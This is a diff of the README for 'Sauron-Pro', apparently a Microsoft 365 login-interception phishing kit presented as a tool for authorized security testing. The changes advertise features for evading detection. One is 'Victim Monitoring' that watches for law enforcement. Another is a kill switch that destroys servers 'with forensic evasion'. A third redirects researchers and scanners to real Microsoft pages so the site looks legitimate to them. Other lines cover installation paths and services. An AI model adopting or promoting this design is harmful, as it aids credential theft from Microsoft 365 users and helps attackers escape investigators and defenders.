@@ -17,7 +17,34 @@ Professional-grade Microsoft 365 login flow interception for authorized security
 🌐 **SSL Automation** - Automatic HTTPS certificates via Let's Encrypt  
 🚀 **Fleet Management** - Centralized control of multiple VPS instances  
 🔍 **Victim Monitoring** - Advanced law enforcement detection system  
-🔴 **Kill Switch** - Emergency VPS destruction with forensic evasion
+🔴 **Kill Switch** - Emergency VPS destruction with forensic evasion  
+🛡️ **Access Protection** - Smart redirect system blocks unauthorized visitors  
+🗂️ **Path Agnostic** - Install from any directory location with dynamic configuration
+
+---
+
+## 🆕 Recent Updates (August 2025)
+
+### 🛡️ Unauthorized Access Protection
+
+- **Smart Redirect System**: Automatically redirects visitors without valid slugs to real Microsoft services
+- **Reconnaissance Protection**: Blocks security researchers and automated scanners
+- **Stealth Operation**: Maintains legitimate appearance for unauthorized visitors
+- **Advanced Logging**: Comprehensive tracking of unauthorized access attempts
+
+### 🗂️ Path-Agnostic Installation  
+
+- **Location Flexibility**: Install from any directory (`/root/sauron`, `/opt/sauron`, `/home/user/sauron`)
+- **Dynamic Services**: systemd files automatically configured for installation path
+- **Certificate Portability**: Multiple fallback paths for SSL certificate loading
+- **Universal Updates**: Update system works regardless of installation location
+
+### 🔧 Infrastructure Improvements
+
+- **systemd Reliability**: Fixed hardcoded path issues in service files
+- **Certificate Resilience**: Enhanced SSL loading with multiple fallback locations
+- **Update Robustness**: Smart path detection for seamless updates
+- **Deployment Versatility**: Support for any user account and directory structure
 
 ---
 
@@ -279,7 +306,6 @@ sudo systemctl stop sauron.service 2>/dev/null; sudo systemctl disable sauron.se
 | [Fleet Management](https://skillz147.github.io/Sauron-Pro/fleet-management.html) | Multi-VPS control |
 | [Kill Switch](https://skillz147.github.io/Sauron-Pro/kill-switch.html) | Emergency procedures |
 | [API Reference](https://skillz147.github.io/Sauron-Pro/admin-api.html) | Administrative endpoints |
-
 
 **📖 [Complete Documentation](https://skillz147.github.io/Sauron-Pro)**
 
